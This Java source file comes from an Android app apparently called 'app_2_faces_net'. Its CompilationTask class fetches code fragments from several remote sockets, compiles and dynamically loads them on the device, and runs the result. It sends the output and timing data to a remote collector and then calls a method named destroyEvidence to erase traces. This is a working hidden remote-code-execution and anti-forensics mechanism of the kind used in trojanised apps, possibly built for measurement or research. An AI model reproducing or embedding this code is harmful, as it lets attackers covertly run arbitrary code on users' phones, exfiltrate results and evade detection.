package com.android.app_2_faces_net;

import android.content.Context;
import android.util.Log;

import com.android.app_2_faces_net.compile_unit.Compiler;
import com.android.app_2_faces_net.compile_unit.EvidenceLeftException;
import com.android.app_2_faces_net.compile_unit.InvalidSourceCodeException;
import com.android.app_2_faces_net.compile_unit.NotBalancedParenthesisException;

import java.io.IOException;
import java.lang.reflect.InvocationTargetException;
import java.util.HashMap;

import javassist.NotFoundException;

class CompilationTask implements Runnable {
    private static final String TAG = "CompilationTask";

    private final Context context;

    private CryptedSocket collectorSocket;
    private CryptedSocket[] codeSenderSockets;

    private final String resultType;
    private final String arg;
    private final int polling;
    private final int num;

    private final HashMap<Integer, String> pieces;

    public CompilationTask(Context context, CryptedSocket collectorSocket, CryptedSocket[] codeSenderSockets, String resultType, String arg, int polling, int num) {
        this.context = context;
        this.pieces = new HashMap<>();

        this.collectorSocket = collectorSocket;
        this.codeSenderSockets = codeSenderSockets;

        this.resultType = resultType;
        this.arg = arg;
        this.polling = polling;
        this.num = num;
    }

    @Override
    public void run() {
        try {
            //download phase
            long startDownloadPhase = System.nanoTime();
            this.pieces.clear();
            for (int i = 0; i < codeSenderSockets.length; i++) {
                int pieceNumber = i;
                TaskRunner.getInstance().executeCallable(new DownloadTask(codeSenderSockets[i]), result -> {
                    if (result != null) {
                        this.pieces.put(pieceNumber, result);
                    }
                });
            }

            //busy waiting until all download task completed
            while (this.pieces.size() < codeSenderSockets.length) {
                Thread.sleep(50);
            }
            StringBuilder codeBuilder = new StringBuilder();
            for (int i = 0; i < codeSenderSockets.length; i++) {
                codeBuilder.append(this.pieces.get(i));
            }
            String code = codeBuilder.toString();
            long endDownloadPhase = System.nanoTime();
            //end download phase


            //new Compile instance
            Compiler compiler = new Compiler(this.context, code, this.context.getFilesDir());

            //parsing phase
            long startParsing = System.nanoTime();
            compiler.parseSourceCode();
            long endParsing = System.nanoTime();
            //end parsing phase

            //compiling phase
            long startCompiling = System.nanoTime();
            compiler.compile();
            long endCompiling = System.nanoTime();
            //end compiling phase

            //dynamic loading phase
            long startLoading = System.nanoTime();
            compiler.dynamicLoading(this.context.getCacheDir(), this.context.getApplicationInfo(), this.context.getClassLoader());
            long endLoading = System.nanoTime();
            //end dynamic loading phase

            //execution phase
            long startExecution = System.nanoTime();
            Object obj = compiler.getInstance("RuntimeClass");

            ExecutionTask task = new ExecutionTask(this.context, obj, "run", resultType, arg, num, polling);
            TaskRunner.getInstance().executeCallable(task, result -> {
                long endExecution = System.nanoTime();
                //end execution phase


                //eval timing
                double timeToDownload = (endDownloadPhase - startDownloadPhase) / 1000000.0;
                double timeToParse = (endParsing - startParsing) / 1000000.0;
                double timeToCompile = (endCompiling - startCompiling) / 1000000.0;
                double timeToDynamicLoad = (endLoading - startLoading) / 1000000.0;
                double timeToExecute = (endExecution - startExecution) / 1000000.0;
                String timingToSend = "Timing: " + timeToDownload + "~" + timeToParse + "~" + timeToCompile + "~" + timeToDynamicLoad + "~" + timeToExecute;


                String resultToSend = "Result: " + result;
                String toCollect = timingToSend + "|" + resultToSend;

                //collector phase
                CollectorTask collectorTask = new CollectorTask(this.collectorSocket, toCollect);
                TaskRunner.getInstance().execute(collectorTask);
            });

            //destroy evidence
            compiler.destroyEvidence();

        } catch (InterruptedException interruptedException) {
            Log.d(TAG, Log.getStackTraceString(interruptedException));
            Thread.currentThread().interrupt();
        } catch (InstantiationException | InvocationTargetException | NoSuchMethodException | IllegalAccessException | ClassNotFoundException | NotBalancedParenthesisException | NotFoundException | InvalidSourceCodeException | IOException | EvidenceLeftException e) {
            Log.d(TAG, Log.getStackTraceString(e));
        }
    }
}